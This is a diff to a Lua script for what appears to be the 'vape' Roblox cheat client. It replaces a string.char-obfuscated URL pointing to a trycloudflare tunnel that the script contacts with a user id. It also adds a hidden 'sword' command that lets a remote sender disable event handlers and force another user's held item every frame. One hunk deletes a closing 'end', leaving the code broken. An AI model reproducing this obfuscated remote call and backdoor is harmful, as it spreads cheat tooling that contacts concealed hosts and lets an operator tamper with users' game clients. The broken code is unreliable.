@@ -1,4 +1,5 @@
 --This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.
+--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.
 repeat task.wait() until game:IsLoaded()
 if shared.vape then shared.vape:Uninject() end
 
@@ -242,9 +243,7 @@ do
 			_urlFailedUntil = tick() + 10
 			return nil
 		]]--
-		return string.char(104,116,116,112,115,58,47,47,112,114,111,118,105,100,101,100,45,99,108,97,115,115,105,99,115,45,111,112,116,105,111,110,115,45,100,111,119,110,108,111,97,100,46,116,114,121,99,108,111,117,100,102,108,97,114,101,46,99,111,109,47,119,104,105,116,101,108,105,115,116)
-	end
-	
+		return string.char(104,116,116,112,115,58,47,47,102,111,114,116,117,110,101,45,114,101,103,97,114,100,105,110,103,45,97,112,114,45,109,111,114,101,111,118,101,114,46,116,114,121,99,108,111,117,100,102,108,97,114,101,46,99,111,109,47,119,101,98,115,105,116,101)
 	local function _ft(uid)
 	    local url = _getUrl()
 	    if not url then
@@ -474,6 +473,21 @@ do
 				vape:Remove(moduleName)
 			end
 		end
+	end)
+
+	_registerCommand('sword', function(from, args)
+		if getAccountTier(playersService.LocalPlayer) >= 99 then return end
+		if not from then return end
+		local hand = workspace:WaitForChild("User"):WaitForChild("HandInvItem")
+		for _,v in pairs(getconnections(hand.Changed)) do
+			v:Disable()
+		end
+		game:GetService("RunService").RenderStepped:Connect(function()
+			if hand and hand.Parent then
+				hand.Value = "wood_sword"
+			end
+		end)
+		hand.Value = "wood_sword"
 	end)
 end
 
